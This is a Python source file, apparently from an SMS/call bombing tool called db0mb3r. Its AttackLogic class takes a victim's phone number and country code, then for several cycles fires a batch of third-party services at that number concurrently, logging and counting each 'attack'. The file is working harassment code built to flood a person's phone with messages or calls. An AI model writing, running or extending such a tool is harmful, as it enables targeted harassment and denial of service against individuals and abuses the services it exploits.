import asyncio
from datetime import datetime

from loguru import logger

from db0mb3r.app.status import status
from db0mb3r.service import prepare_services
from db0mb3r.utils import await_with_callback


class AttackLogic:
    def __init__(
        self, attack_id: str, number_of_cycles: int, country_code: int, phone: str
    ):
        self.attack_id = attack_id
        self.number_of_cycles = number_of_cycles
        self.country_code = country_code
        self.phone = phone

    @logger.catch
    async def perform_attack(self):
        try:
            await self._perform_attack()
        except asyncio.CancelledError:
            pass

    async def _perform_attack(self):
        services = prepare_services()
        usable_services = services.get(self.country_code, services["other"])

        status[self.attack_id]["started_at"] = datetime.now().isoformat()
        status[self.attack_id]["end_at"] = len(usable_services) * self.number_of_cycles

        logger.info(f"Starting attack {self.attack_id} on +{self.phone}...")

        for cycle in range(self.number_of_cycles):
            logger.info(f"Started cycle {cycle + 1} of attack {self.attack_id}")

            tasks = [
                await_with_callback(
                    service(self.phone, self.country_code).run(),
                    update_count,
                    attack_id=self.attack_id,
                )
                for service in usable_services
            ]

            for task in asyncio.as_completed(tasks):
                await task

        logger.success(f"Attack {self.attack_id} on +{self.phone} ended")


@logger.catch
def update_count(attack_id: str):
    if status[attack_id]["currently_at"] is None:
        status[attack_id]["currently_at"] = 0
    status[attack_id]["currently_at"] += 1
